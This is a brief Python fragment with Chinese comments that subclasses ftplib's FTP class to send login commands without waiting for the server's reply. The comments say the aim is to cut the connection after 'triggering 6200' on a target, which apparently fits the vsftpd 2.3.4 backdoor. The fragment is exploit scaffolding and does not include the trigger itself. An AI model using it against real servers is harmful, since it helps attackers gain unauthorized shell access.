# 引入在ftplib模块的FTP类。
from ftplib import FTP

# 覆盖FTP.login的方法，使触发6200后可以断开与目标的链接。
class ftp234(FTP):
    def login(self, user = '', passwd = '', acct = ''):
        if not user:
            user = 'anonymous'
        if not passwd:
            passwd = ''
        if not acct:
            acct = ''
        if user == 'anonymous' and passwd in {'', '-'}:
            passwd = passwd + 'anonymous@'
        resp = self.sendcmd('USER ' + user)
        if resp[0] == '3':
            self.cmd('PASS ' + passwd)

    def cmd(self, cmd):
        self.putcmd(cmd)